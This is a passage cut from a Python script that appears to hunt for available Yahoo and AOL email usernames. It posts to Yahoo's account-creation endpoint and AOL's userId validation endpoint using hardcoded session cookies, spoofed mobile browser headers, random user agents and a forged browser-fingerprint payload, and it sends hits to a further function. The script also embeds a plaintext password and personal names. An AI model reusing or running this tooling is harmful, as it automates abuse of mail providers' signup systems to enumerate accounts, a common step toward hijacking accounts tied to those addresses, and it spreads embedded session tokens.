IzOD%2FXXgWG3l5Tm4dHRVFiK49YC%2FAUQcJOmygJOH6E6HyfC%2Fn7xXGUjATZdZirwcAuQSeT4A%2BCxh%2BMWOOBjgYDALDeQpayzLyf1C4B7DcfU3FwjLUnPG%2BehbBTjZ6nMSMIfGm1mrUb8D5%2BMGl%2FqdrHBd38MJ5k4o0rXT4uLnFv7lru5jWfEi0Kk8Ff%2BpdhOqOMKjCRr3rVLmfgocxM%2FjNi4IkUv4KHaieGEEUwU9fXKXUwej8IXNPysLmozK4xspl4YM0itHj3DazbJbapWiLiiHZGcaQGx%2Fj0ExVpgOcYR1Zehktb49aCrqbC4AqqpfL9ORijt44VOTpAaVLxhKWH7sd41P0j3gBzfqgINx5hzGc2XrL9PEt2bn77bbO1X5c06jkuYCHfZp2K%2BUfRxff3u2SVkL5n1OYH9UlTXE3OLytL%2Ff%2Ba%2FtalVwQobQz9YI5LWtjvBPOGGFSydkXK9VpOznoMEwmALBrytzpWMmTHYLS8xFQ2fVDU6qabhFcMN6fRzdjAidhjEv4GlVlVlKClTjjM4O2Qjb2eOrfW1dckeVHaHXOeG3z6ibA8GQ%2BkcImjOMHE8636EiVT5p3R7c8mG%2FiuBkjn83n5LjkhTovnzmF3SFlPi9CqKLVuUO89YnefvwzBkkdU1Iqr%2FthVMqliJW2SC%2FeGW2xxzEQ9HHOmYCt8WUXEe99deOMKiJymntOUwSaBtwg6x3GCXXFKQhE2CKcrzT%2BGee%2FnuYhoxqSmJ4ExE6irjuIbKszf6zAZIsDp4A8aARUcVNIg6TkcKYYmcFZNYYIqobp%2BU7auzpN4sT3u1P%2BSH0Hs3x4%2FKoHTCQTNBO2IdemtLvTCg6hZTSRR2hIo%2F2%2FsYXjMNXruNXdkXDJUsdChvUzdhy%2FvOdPacP3muOXhQgdl0Lnynv9M6qi4QzbJJqs1TBw4qa7mcaG0K1RuE5q9X25EAVdDevSdCiji4uu2Ze8PoB1ft6N%2Fwq5GkCvJ2lAI68I7EtiGF6g%2FSd2QQHT5RhDGU14K51go7Hl5rH9Rpg%2BKlOHJfeL8WOIf0d5XTE0sqcaQo26w52r64f3B6IUfrXGnNkfSIASP%2BWtltbVWYQm16Zsh1BG2Ga7eHu4B91ZP6M6Rfgc%2BrBFjR5PpcxZUO%2BAvgu%2Fg71AAlOE6%2BHHWJbeX6friDyM2up7pwi4OMs2jPcEG6d9H5hNDexxmkWbP4iuBTiifthXvUhVZPAEDrteBwLxhGhZTMzGtDUHZPLhObAnqbKFD%2FHpNNXxJ6uBEhJEB%2FMI3ETBr5ZUm8DpJcf079ywP7ZOv1UwO53DwaeRVDObu6ZiaY%2FWE3l4Au%2B0qQt%2Bi8hEMUkBeEkeVpe71kLY0YyzRWK2XFFlAvh5xQxgs04HdqYrkYNQOubb8QeHacfGa%2FUAoXUc5l5KX%2BnKukNJtqUyGsKgW04p9eNQ2LnuTRNcNRbMaLZSR9foZIbUXxrWMU3slJ%2ByG6YyDQf8W2%2F%2BALS4mDkdgBcRaYlZsydIGRFJjeWwb2NmYCQJA2qwHzDYzkLcVoPQPvUaexv5g%2Br%2Be1CqwSgsDQiuopeCBfdGgYQjGOzNPTzKSE4g1EEs28dhciDdqVBYE7uU6%2BtzN5kvTWCfh3VZ76q4EzPIhFTKSL2J3L5ztW6PnPdwqVZBFDSImZFeMcCpaEkPlpveURFtBGpk2CJGF7Wu5Z5RPKAw1iz5UZnQxV9CpWjGAd3STeV%2FfN3wjFIg8ziE%2BFQyHdpC1v60FSGfza51APVTx1qbmxGFr50AzH9z%2FF1G3j9GqnV8cOKWVVdbLl9h%2BQrl6%2F9dec%2FZ7VzHq0Znxy%2BL29B9r0JaljT3A3wiZ%2BBxbGohSrj0bqB9qwr9oen4LR8uPpZZkIC5bw%2BI9MZ6K%2FjS%2FbNI%2F1femloypRP%2BvbNHCT38WrHCnw%2B9ymVdSc%2FHjJo3dPOsirNvcGce8KL8tuiPcqB8viXPvfB7B1Uz8F3UUcTEEkN7DIzpeZzOc0XWW2RMc%2BScbxfctbNTu08Ssu7G31i%2FrdeGMMLMPKvxDNLB4VjjqgakQv73NuyCLQMfV6zMCncYfeY7QUk2xXNaoUSOQwK3xjrba%2FYSyt%2Bltn3ahFeN5MICnrQZo7XOvZ398%2F9P3jg6fybuUnzPFDRWqR2A4MblNIGaGENaX2pv3OuH38hJVj%2BPgoZ681uzaDn%2F%2BooXcR8lV3hNzoh9UQlU6TGnicsfL9Y0QE%2FY1Vp3UbLnmCMP7P9CG07yer0aBoFxf%2FHzgnoIm4pd17t2JzYbNwAHxow2ZbAFcGZ2z86lkUUHWZUeDa3npgpj6%2Fr8qP%2Fb%2F%2BIIb2HgRvPeUlER7H0EgDtRRtrxiNHsvvKIKIy3rjfGb6HONrY8ONpRKowyWLscSsemR19mBHEhtb9TMb7IhnfKXPjxnyT33Nl2hpmRFeKWb9vtEd8WIG7DzwxzY7vVcHUZPQTrhEh9dcqQvyZv4Gts0MQ%2FYxl8J9Q0WPC7XdwXMeukSDxn7CxqbwQlSOdevmjgHgNrL7%2F9CXlyUM79D2MdxGd3s6JdWiOShqidYrynJL3W4Nv9yX8MUGfYRTw3gHdwitGyGwoVemV9r7v2R5MMF5KKuBtM%2BxwsGo%2B%2FW6tczsF4KjikgPPE0GDfP9XOO%2FBwDW7ZrBtiSYoieDDQL%2F6efTax43pLPDZDSQJM9wia2r56hPIQNfeHXCuChf2I%2B4tfZQ6ulu7sHUtyrsAEISpcEA9zfVNHXnEa4wxe2sLKZtphV6U6mOEmwGKeY%2Bqi4Q6GrqnIZzuQLU7R8%2BLgCIOCq95Wrn7pACI4jgjt5qGY0Sm0kvi7P1vj549L%2F795Re%2FjFntypX1LVPA5BEtjwXMsgjqWRyAjz70StdiFysgWZAQZ84%2BGUxiPsW8IOLrPogYbu32oCsLM70iJGWQTgtBgZ1YN7pa9wuzRKfXACRc9Zbv8jdwDS2ALUPpljlf2nA%2FhPesLWnO7wD0KOvY%2F6zqAwUzV5vvDiYAk5NCkxgkwdMX4i11qaHCCkTM6F6S06oTCX8MgwlmfmdE6U2%2BE7od4Kn61OK8%2BX8PdqOegp%2F0Nngual1G1Ge7iDSVK5wdzehr4eMsXefPEeprMks2lzg7QDG%2BVxLa36KMHhtpu9S7fyF5Ox2R5EMqxynOqT%2BZDsE0qQZBRP8507qJ2anaUQg6zAbofMd0qF5Bhxrzal2MWO0YbodgLv57MLjchJJtg3HXNTUMSAW8pFB8p3HlVbkKe8IXjlHm3%2FL1Gt49r%2BMt6pTR1OszTRW%2B79fiNETwTX9eK7RXshqh62P2EmnUj2fEdC0Q3wTinhQ%2FzrTtLHCrdXn9ljM4%2Bpj%2BC6qcs8JB5tYeIH9u4uBRerr5mr7Axm7K%2FxRZoFkG%2FJhO%2Fd%2Bka28Pt2X3MSp9bR1%2FuvWmapvxBImzB7pNpqX3Z%2BYLf9kIFvEo58Pq0T3SrXhzy%2BMeARVPeT874jdsLRX%2BTRO%2BnogHrxwU1OOqq1you2QsOwuGwl%2FuOgIU06s0W6asASv7Qf0l%2BDK3zqXeuD7oESlWvB1%2FB%2Fmjrvxdum%2Bl47dQhl%2BhIytmbkzs2dE9P%2B5KzvdH6WN%2FEtv92BrrRa8ev%2BZU0pepmbQ4VaNkQituImlIJGXWXcge6rxNTKnvQ%2BJOYlRYhyDmiia0roMK%2F7fSTuR%2FAN%2BeG0IA9Js3qJLhPqXanBmn%2BxcUhEwCYB0f2bCqeiISEFb7Vs05uXZlmUpxghzw7q9im2r1lpqAh0ydSUFbZ0C6LsCxed7Sc%2FcXNFtSvJsqs4Pi71UmQgjYqXTJ6VOVhaalTK9jUC8%2FmYmiztkSghaAszXGRrbgaKM7mrsF1ArvMdh%2BNJgZG4RIFd4NSU7Os%2FvZB3tAK2lqcySQYJjztfeAkJfGNS36anLDFY0iCy9u5R36kJaopwvaJPjxHkUsIw77kPm5xPPKnlJFFIwn6h8Lz6DmGaSPRI%2FxSa0MeZo6lerfQTbhpx1lztJAH24uwrvb9UXHkvHCUpAWdebpc2iT44mCP8MSluUWfK5k7t4F2M8KnfmTfaCsR9IZdDNSzBgh45lQMyihQRPRjvn%2Bzej87ByJH7Kr2nxinQZ87kfmmrUYEbzDVoJxVQbZBqGOCTargGRcsgWNjE%2BZN%2BDmDWWemjd6yes5CO6SxA1L8jSATEVXLz5BkfLE%2F9%2BFBl0fVQWF7dhpOCRG1FOJyamt7z%2Bd4mQeqehS9GxJF%2BPHFRcJ5OBdqR6RIebOOftfiYYLbrj6altDstD%2FGuhQvWRQqegHDfOnuuPSwr3m0gFTiS2WpTC4VwFwjMvCk8f9JCQVGb5Rg0TBqMQNjbwKzJreWTiFiwER%2BdLVcCA%2FxoP%2Bi%2BXtsECgNIwInFtBtAI%2BBF6yEDZwRBjCjTnfktou%2F5KlSp%2FD6di8l1ilg69us%2FudxuXZtFE19GnDJ%2B%2FFp4Ur0GkUAAJDHXARCjMQpx6JlNvUq7PVEupgi2fxgF9kHR%2FklM%2FwIw99bHj0Aw1OGOYLi9KwDa7wQ7EqJ1Ks4C4AhgwCEPGxl3jVWbPjavLgePrmJd5dGQc3Qwgofsq%2FDV4jOJoBv7m4rmgiQ0ewSVW1SkF7pyRRjdy6FmovaGwe%2Fz12BcSBPEMRwyGPxF2gdU4dE2rAGzKC6RMwlWNgNt%2BvxojgZ5LgfzoAYiqxc6FYk2X3MoFBsCxNC8umy1yTNAKX10tFP1XZZleV21WqbItFr6nwjrAQoMJbPFzpX72QHS%2BmKoM1aKpuwi5KNjUgBnlPPfbEfJwBQFIdQYVC%2BMVtRje8YOJ7UCbsuXLPw2JC2kFQyc2VF3BiWZ1weC1RdShK29NhVQLVIFNGTYeqpA%2BpeqxwFstRYSK18f1I9A1YCHLWFNZbqQQdm3EeiC%2F3tvDxkyVz9l3eLIEpGKQtt2Ia5js5oqYeSZ84Cx7K9QLCHOfnohfaMxb%2B%2F3utX8qs79o1IYYnyBmEPRR8V7do9rJsr%2FXhsHL5c02FVrSRb3YYjNZ%2B2SoCFKurEjtsgoGdkFS1t0O8s1Ym67wfIArDdXIJ11yRCxxIqLnFXH%2FbVuczBwMv2XJTkqgtMfloHmdpG5BNKK8lhgVp2xjj2d0YEmg%2FXkviw9eZV5dqC6hm2lkZxd%2FA3GNLvVFh%2FTdvSp2%2FFsqHwVmO0kgts5g2FWbsflq1F1EYeKkBDaPOcazQoGAXk1sVYMCT39tf2CUo4kEwOxxkksDqoc9pcd90huI9g0TDb4i5KjohgyUmT2IE%2FWjFSg6Qi%2BOGiC064cMJoPWdKrUnFaLrl6tJZL%2FFfFnhSqlVGr85VOuDAenD6TN9Htp4Oa0JD5U2jATd76OFIX1xWOa8Y8lRFpwQ88jmPHklvh4DUd6ponHTt9aGugPXQoViqA53pAe7l0%2Bwq7AYA3xU3Wgwphvpr7mEPUf7EydH6KocYeLXrKd17G4kdeoawIcmZK%2BXMUxWP1%2Bqx8E1KFOSwfwBbT%2FL8ztj3OYKzGNqSv72ik%2Fe0PHMIjZsFA8kjgnx0jcYpRdSLDof4OT0W%2FRG2kVUUezE4%2F2KitDtvvdLyRN%2FP%2FwQx%2FNdmitvb7PpjjJ16R2YTwMf9iYehCta7DpYg296ycju1jvyfNxxP5miiAlg1o%2FVOtIZULzbknaR%2BoguDm%2BQltXg7c7DCep4aZwoWcHNp9o6jFhGg2KDBeOd6Wv0SkQC%2BE28OhxBkqFDDK0aLuglulKxgw26yiCDaSG3g0qBIlVJqefbx4pwL%2B%2FKNxL0b27fS1qh6SOqjWiZVcGCuAS27f66yk5DUZ1CX7gKUhXwcd%2FEqyf%2FjD3%2B%2FtHLMMqnQXVHvS83qDzngWrwr1sIy3StukarE7WIaKCJ7CJLEq6LstyV%2BhcWwYSqW9Ri%2Ba9Hjk2NLjj4%2B8d2fpkvEHnqdnmb3e9lECWmjew1FkdXu%2Bbmr4Abyk2e3rMMzkE%2FsIeZTj4rjZ5epNGcXKhkLOHhpimnSRrjQhnBw1RoofDxJPMFZh962JDvQL4AI9OGxaWvtHdZ0lY2WAZb0Mdhp99ZS8i6ssyfL1GiCNoJ5AioVvazj5gnILd5AYS1Wawkagwkp%2BfVQeZdHtMANXoOIXTrRAShYcqXd9TTzk%2BoMV8NANBVINku58e5Z%2FpGOxqVc7VuFfgHuxnatj4Y1nBu6XHw%2FYtBTOzg7a%2BlCAKVSRgG9PpOGfbtG5WM4D8cU2QFVUI1wENvlzjg1Z0Td9QW3YisjGaJKyLnyfBrzK4UwLZiZHtqvfu75pVOxzN2z94%2FmoazlJJidYoSSr8%2FLvmg2FzBjcZFmudHvSd2viSO6T%2FlJEzZwcyYYe6ZK1ihwCbkk8Jo0l6TM%2F7yYPl6wmR%2BP3fGtCsutLSZDEZmEqJg5JLpSbBtdqpMsYwl87UBqiG1RbpJh6Pm0FUaukQ6AQzCgGf5srQgr7u%2FboIoECR%2BfeCEkJiEFhrTyobI7ONnF%2B%2FEeTgxeujYEJGgJnd0OYrLHlokNdE2wCfTp4DO%2F07abMGnvk85xUyaoXNPXPVDoFHTEbMppASY1LXY1wlgEtvXXL7299qqh6r8fDpTIKjsshuSSJ1mV%2FBevd%2B601HpQb%2B4oR1AxxVg0DvDAWxpEFYqhn9erH1yqxWm5kKDSnT5akhQGKf7i8JmjcX4TtoiuxFEPqptou9JZKeB8ytbTNEpQn5e5JzRIrwk6dFMw8YCfuXkOlBx9LKCNdjoqzRGnbiCEc6GdL4s%2B22zEq%2B%2BdYMJRJ%2FrI07aXcY%2F6LDDKHQYfOvB9CMK8itKCLxw8qNCGAMIRDgIRSyfKIbL2oUQha33FXSfJAjh5dNpw6gV8lj3b9Si%2FaXIFia1HcsUSFocBHl9tyIH6cH%2FNpX4RavenBqKI3Pok6tprzDCTIe4%2Bavn%2BaKioPU8wxgpaM4LkZYT8ykP7GB3GwgI%2FjmvttAQC0MFEpXRQ3OTYSI88IbkjeWZg8Nip0zqqk8%2FGFyr7AVYRWDhSVLFCJzp3EbMdqvNCTLnOXJnwrbMI90TJT4w9yHxj5f%2B7DDr4vHYI3pXqxHA%2B%2FwxPrjXo4mtzjfOLPgJQeNADebjc8zVimwdxq1%2FLN7LGWCs%2FvZiJ3iPeA5u%2F6M%2FaOsFIht43BI6KUYq6roYbwGVhwwnBghfgRxU7Dj0BrOb2HPfFT%2BqMxlKxiNtYhSqSkOMXSaWwGwBZ4Mt9NDJ70TpXpmhNwSiP0o2reOkGvbzaQUTyzdLyuU3YZCpo4oanEsBdjY0uxnGM%2F9SSkwnS3PwLF%2FuHGb3ddZiwDfW4vTMXbfloE6o%2Fnk0Qb1rEBjqjKVWjfVDHWmzaY3YJxa6utBGLFe%2FWeFS6Z0SLWrGFedt%2Fwvw%2BSTIr3dOvmE6Qfyo9DC3HVCdcEI8TsjbMg4iGgupjpESqJZib%2FQdKltcsSG8DY9N5Sa6jLuRJxh%2FtsoJi4MraXyRKJxRxyNcoo9Yb5cDH%2B4%2BUHoIxsuqbdPLqjL80zbqtCTGPzZfVUmBkCigtIdCppqAstTG2c9n%2Fg%2B6b6ufYAXC6DC6KmV1%2BQND2Pm5zXwkHDKWJejda3zohYYTWMm%2FsZ7eZhFV1MgGeJa31QLh1eIWud7j1SDQ9ZNBA5ustjU1B6oLzl0lCgh89%2FWytrBYwFpU0fDRTBHekbLsVIj3IXdrANNadGvxMwcz9vKNMTM0%2BxG4Fx%2F1aa47Uk23pRfYkGun5C7lBlxbQO8h%2B%2FvL0HndA2XNsUJ%2FFW6dxZ7fO52XneiUAk4Nk6E5FTBojXrPSLCM7dI4rgXPUE66ZjutVQCghBRsCMaGax41WOpHJk8LQgo8nEQt1%2BOWitduKbxqm4C10ySH8BtjiKauLBK40ka%2FDrzKRyIjKDE1sBc5kU5V1p2Q9Mh44fRvEd9clgElX33eK79Ju4OejkvgVW8KFsisW5qtHO8xiNXKOHnoL6GosaI8mQlH9tHKfB5fENAkUsSDIq7aTwMSk6rcQ0pUc2afRQr1Ttx64xzkdhu3%2BjEWcqVpXb%2BzLxkCUMSTPCaXKIZDqjFB%2Fr4X%2BazgF8yueeigGjIdgnGOcNucQcG1k%2FCldVwHN84dKy1DCHB9%2B0rTo9vGCuY4wc63wlsmmBnRFtQ8X%2FRtfSk5TzEGy3uC%2Br1%2Bd1E4jZUj8OFuflQA%2BGKIcC1mg38gCdjs82e5lv6hyy0LUfl9EcWQQYu%2Fexb%2Fk3IlokJgcGSQlAWaxCzmTxq6kLCQ2uD476WTVSOO2NIKYu%2B22K0%2FlnFoTHll0QkoQq6Anq%2BN66NlJVByRAklaw%2FZzyYYHk9cc7U3uWCb3z%2FEsDI2Toa%2BLWi2j0h6wyCwm3UEm7xjSPIcqtaval02lufFEXvMB3E7wcV1NMybUvbQeNGZDqUAb5iN86IBU7dYSl1wJ4GQ2VBEtz6vdW%2BNe3hz2ez9LToLFMCC%2BypFqjU5de9niSCJQYHIZwawMDmDsgofOl%2F0TzpmvKGENS4KhJRzzOmzs4UZf2T%2F3gPMr5LJykzLWMJFBoH7LdzpMxEMIH9RihBY3iGpy%2FjvTi7ec663gVQF35lcSK96QPH22l330iMxlB2ft1%2B8dEu%2BDcYeYb73D8uW%2BruVXlI1%2F1mNSmJe%2F9i2EHDyBtaEQOvt8QfmlIOQsKe0rXUKFMTPjPLDH33tNY05JR%2BS3p6gXvsNjDDAxblIWCfGQq5lZkbaYDYb5Q5aCKoQ6mWx3aI93xCcq6AtVxLIiugO95rvVLusxVRI%2FVN5I7lCTQWg%2BdemeCTa7HRkgGAvvytOF9Kph3JwC8N2oRRBJR8ufH8YIJ1FJeWjccWqSsN7GpAOF6HfycRIkK3LEbBKMQO51GsjLSCQTrs%2F7hqiFh3zrIlvsHwJkpQmRLqMT2vaGMCfOv4JJqc4FbXWnfhIIfnTvoxxKetzRKPtwGXK7ywMh9IYGiQ0iygc1eNdMiwVtdRZMyyhUapW53MJUEXlZVdUGgA%2BzTLmi1N49pemjj2hbKPaah7zLm6mJH0H3uztWx%2BGszOea1EEJszI53Fk4DkaC9b60jHAJZfD22Ek2bd06aGDnjLzBXtm8VUXpm8bqT6L9qq%2FmXy5Cmxl5oOc0y4hnOh3gRTyTIdTVtp%2B9T6FpddYSO4FSTWlHSe6VCN9FWwASdvKaFwATWswcfKqJt%2B6gYqgYZsm240fdOULsapOXrML4qU2qcRHR2m0uPb27wZUlVMH7gHt81K8rYTpaKRWj9%2FLHrnRbCgBo35EjTEnGx9YcQvGOx1ann3eLOwKLaBbGWX1fbmRtaP48v1RzKVqxARFKR2JKIdFF28dsnYbfpvuwLtHVRjY0QMYPJIFvQ5aPuDtyvbIzDpDvDzw%2FP4mlEecl2eaP3MGiyt8dkfYMUG9gsrOvuDsr4tpKq0TUDNDZwV%2FUkEfKOnxIwrcZauHh8KTQ%2F3N%2Fjb73OswWIHh8%2FG%2BzG%2BAFziPRTK3UBwKyVFCzUN1ovEeUFX0KWiMgxKDtLbL8jiXEO%2BPbjR9%2FzDU93ilzeP%2FaG8buRiZ0Ba02NB23GPDQW%2BYZTdZEkr7oP9HcjwfNpgGgmijWwzdWM%2BlNx78HMXVgS%2FXtga8l%2BR1DOfD0%2FCr7XWWL%2FU0RXL%2FSGWPG8ynl0rQpNXcCTuZ38YdA4e590oGZPtMuH1nklkYwPrQ72JmDSiY35vefuHS3JWIakp3Qx%2BrWVAO9mA7LO%2B%2B7s3Kudl9GzoNnJ3LGxjRr1GDuLQv%2BcOypGuM1C2AQPh570EbJTA8E2qNjivsq1HRurqrJLHxE1C6GgwbP19BrGgSWdSQgNuA32ij%2BaeowQYg7nhBHjdY95WO65di7KV7CbZ%2B4Abe4yJxERUeFu04oP89kTpLUs7Z1om4wrO9qq0gWgfMUpL0Ewetd%2BE%2FGMNnBJjxMC53xn%2FmCoXCnJD%2Bcmi8BGnk7XrJ1FnyY581pPWEvE2EUcJMmwy0gGEtI1yoHO%2FSZkxBpjieDmPnOtt40I5S1m5sVftsQTHYWVslhnnfF08aTPd%2BQozPvYlUvGjzTzt84pFtIsM6Vsh6CZwDOx0P6PBsI3zbo1RDC1ddDacqXv8J71HCVn8c8T0eVJY0K7N2huD9nEfp29%2FLV7P01sbSji79lGGcq5o9SWGXM%2FSph7cPa3Ervgfoj0pWij%2FaT2j%2FXFPUPKGp0t%2FYHMDi75zcVFsAr0vd%2FywDUIlHa%2FevkE0gL%2F%2BjByg%2BRvRw2yxmKqICir%2Fd0qLMDygBoY3l%2BEQjQpy3C8l3HuNQip2pKGNohtp93N0MIW7kWSHdPjnd5xLUNEqg5vp9GIAMBrO%2FzpjpK28PkPXjc%2FDNVerYdemssmPFdMRarvgOcwSqGpZrbw5fbBdE4918QnP7KKYGYIY2RrHFY1kexex5WuZ8TedOh9KQpuxGQ%2BjikAztfatZocaE3OkC1x8B5iP4odcF3kejxjb1llC7P44QvRp57xMHHWPvwEgjkz6vkqm8hRfZJjE%2BPPJ%2F%2F31HNwS79DlR4GCxNFv6n1b2beVrNznRa%2Fv5d8nprUV6u6OlccUArEM2r6Z%2B107VkPrZ10Y4okq%2BWkVw6nNqt%2BsyqlqjJllWu1lodwgnUrbWgUdIcAivzW0vL%2FzDpBvpEqjPMI7OXKkRO5nHqXAPuRkz5cGlXGoZ5HjG67aG4JPwv2mze7ONWKWUABIzWBkScdCusmTVDtLTN9W3%2F%2BFDF1LvRSxGd7AvXt5sFy5ijhSVOQt9OzA1M3MdBi5A3FGKlfael6kjVwEYiTbw%2BSABU2JKQtYMpCfPxdUfv%2B41FUzLGe1ONYjnqbpIXE1ofROilueUAFyKdMTNCaag%2FuIIiFRMYawZe7FcWQJR%2Fp2kgPXU1vaZtI9sVEQaZVsjD%2FoUE5vSDVfzxkvDyNNJ2ZhokZI7BVPXKNX%2BjQulYXa4rQRjDB8rdyJ6CLTWGpNY5krSTw7ypdrsKFgnHhHaHuFGxlYfJZEmPZtoXFXB2psrQBFpEWIl0Ctj6fq7S%2BM8UOZzqWadhiYPr%2BObXiStFti67p38SReArBWiR2D7NMyT45Kgc3GK7Kh873PWscQWz6Zgi%7CwkfRmkqhMbMg6hKf8GxycA%3D%3D%7ChNuPVuNTpF87mjj3ggxyHQ%3D%3D&tos0=oath_freereg%7Cxa%7Car-JO&multiDomain=&firstName=Mahos&lastName=Ahmed&userid-domain=yahoo&userId={name}&password=mahos_s999200%23%23%24%24&mm=6&dd=2&yyyy=2000&signup=&signup='

    rr = requests.post('https://login.yahoo.com/account/module/create', params=params, cookies=cookies, headers=headers, data=data).text
    if '{"errors":[]}' in rr:
        print(f'{A}Good Yahoo >> {name}@yahoo.com')
        email = name + '@yahoo.com'
        serverYahoo(email)
    else:
        print(f'{X}Bad Gmail >> {name}@yahoo.com')
        

        
def chAol(email):
	
    name = email.split('@')[0]
        
     
    cookies = {
    'A1': 'd=AQABBM-IBWYCEEaiDM73Eom3F0sCAbGckuoFEgEBAQHaBmYPZtmZPjIB_eMAAA&S=AQAAAlwnN9PfjWQ3ljKQSPIqNIU',
    'A3': 'd=AQABBM-IBWYCEEaiDM73Eom3F0sCAbGckuoFEgEBAQHaBmYPZtmZPjIB_eMAAA&S=AQAAAlwnN9PfjWQ3ljKQSPIqNIU',
    'A1S': 'd=AQABBM-IBWYCEEaiDM73Eom3F0sCAbGckuoFEgEBAQHaBmYPZtmZPjIB_eMAAA&S=AQAAAlwnN9PfjWQ3ljKQSPIqNIU',
    'AS': 'v=1&s=iMjb9xo2&d=A6606da6e|nLcjqP3.2SrBO7Z7HXJgOtD7zR4GtzlxJ3fvW1VY_uHgHOCzD65FBQyh812_P6hnliuUJ4JTX_ymNaVBDM0yneJ9Rm86kuW3oNmichOHbzuwySkx_zaZJmdODJJxQXq.jMifDvB7CPoPhFFqKWf1slUB..D3ywAXa1lJJzEH4Q.OYLdX8N26W.X9.EiIF5Rwt2oAjajf6X1w9CYbYHf9Z8xu.EebkMJw8NaazP1gnL0O2BATMaYvyGk9pQrpO1TivrsYUYzC6Y6Syz_QxjK1vJNzo494biVQ7qZ0BgIGzDH1jFBUh38GZtCP8jwWgLqAim5C5sVuZp5PbZYGJhvyBfF3JS0mfS4RhPz4zHpNhOqDtSYV43ttXx7vBV15VGcUdJAHeYEYWetWLBX09ulwAWy4CW2WzCwuWyIw3l8tdk80VVbGGpJXC7vo3KTinycJ99QYd_IoeDJ6sCTLrzdziArenW8hHk7SUINaF69dant0EwXnduza9yuIU22HgMuJpVwWvkt.Pt5zlk7ux1HDQKxQFiIJ4HNj9YHsJYkxnUodMaQEv0HQAgFBB8M9kdmbRDVJwi.DKDPKK7QhVZjSJtGe.pi.A_aIRsFk7QBktMy0F_rCUsNIJr5.qeOb2r28LL6i9G85lYGMp2H3dZPpN0CpELFqllxUZvrXH3tlCupEWg6Gggg_NZSNSE6H6aO4fNHGeQe.qApPqHj5F_rLHlx_YqSyVcRYjDZlPFjNHIJxowRZDmpa28hEQR5ilf5mleR1IMusPcr9kgvsL8ZnJ4moMUpcPp5qr3Dwmzj6Yxg902zJp29WlXsYCOTKR3HWag0qjRzbu3SSrsZ4PInYoMtYQiaxV5ROXKQoB..mOmEdlw--~A|B6606da7f|KXzhdcv.2ToSlAU95w7xfmoFS4WSx2bTOW6hWX4fj6Z5i7uUFQAcgnKDCfUlKkBmXN4VkrNrbeBiu3zqm.QO688W0Apsth3M6iXSpK07B0hDVFFLHBJVExcNeoZl8RvTacgf5wFhd3na05IRcA1vMstgro1d5ouCSG0fDr4CwlpHUtoPBFcWnAb1z3mbYFYzb2D2K2uX7viLGU7BTcM9iCJuxODImNQdsQxJ_ZXZpcG8FjiYsIXHySUOnUnKtqQMVASvUsdazivTV_uRvLzlXRDfboSopvdCdUKi_ZhzcpuED0i.xGXkl19q7x5O9i4OwLbx9LaWwELfquHQRTTnmjEmUczNPzciLLyUgDRuFEjxO8b96BU.w_55S7sm2JahjoQFLfvyfHaA0D4JjePqdGTGvM7UKsjL1injKImKnneg4_MNBMrbAlklenAl1TWuk00__PNjkzSJ6Dh8_S5k1l0ihWCGl4hsvzxEfgo3A8Lkes4xGcrpBk9A4gUBLc_Uq.N7neYly_J5PwAJ3YGS8Owq5QvCyZ1859CvuCqXsjNk_.xJ92SqBftrAkplyTPMkz1vFbHYjZ8F42inJilcCveCmUjFsCYQA0UyLEJaPxG_fqrcstS5PjNDHj.I8aSq1uL5uobaeAF23yUqSnc4Od1MJn_zAn34BmZ05ip6a4gco9omNg.VqQEMhSkqivkoJvMQDOmiHvMo6p9x7RHZeVaNL2sseohXbfIWZawDpz2rk6jUSWfaUil4LyLBJ4F9qna0MZcKznlt5TgdgRgSQ7ztt.nLHYyTMtcoQvHiyp8IvEBukABr4ZGKj_VY5QWaBCG4H6Gxyg7TmBnOTfqkEXzBODwjzNRL83bCeF7eTFurDkLMZrOYK5tUDp1eYEU3YmFMgqrdZ0ByubKhWnb4J6w5etkNzGNQLjAWfZlMFSTK~A',
}
    headers = {
    'authority': 'login.aol.com',
    'accept': '*/*',
    'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://login.aol.com',
    'referer': 'https://login.aol.com/account/create?lang=ar-JO&src=mail&activity=header-signin&pspid=1197806870&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Factivity%3Dheader-signin%26client_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--%26language%3Dar-JO%26nonce%3DZ8JDZodU11jJe9fCajoCf4lCtVVdPJbF%26pspid%3D1197806870%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bycal-w%2Bopenid%2Bopenid2%2Bmail-w%2Bmail-x%2Bsdps-r%2Bmsgr-w%26src%3Dmail%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tL2QifQ.JMX40ZssLtCMlaqAOZYFU6Tz6rggXd8IYA-lVO2jkmWcFPGEJ3tTkOj7qGkKjtTLXofPUFFQ6Uzih1pYCkh_fgS1zD8X5Ge3c0oSKTchP4AdNmsEetEyDMoUijvOWJVVbDe0byUHYQzCmE7F-o2187M5fpzxgGEV6U-7Xm4ywaA&specId=yidregsimplified',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': generate_user_agent(),
    'x-requested-with': 'XMLHttpRequest',
}
    params = {
    'validateField': 'userId',
}

    data = f'browser-fp-data=%7B%22language%22%3A%22ar-YE%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A4%2C%22pixelRatio%22%3A2%2C%22hardwareConcurrency%22%3A8%2C%22timezoneOffset%22%3A-180%2C%22timezone%22%3A%22Asia%2FAden%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Linux%20armv81%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A0%2C%22hash%22%3A%2224700f9f1986800ab4fcc880530dd0ed%22%7D%2C%22canvas%22%3A%22canvas%20winding%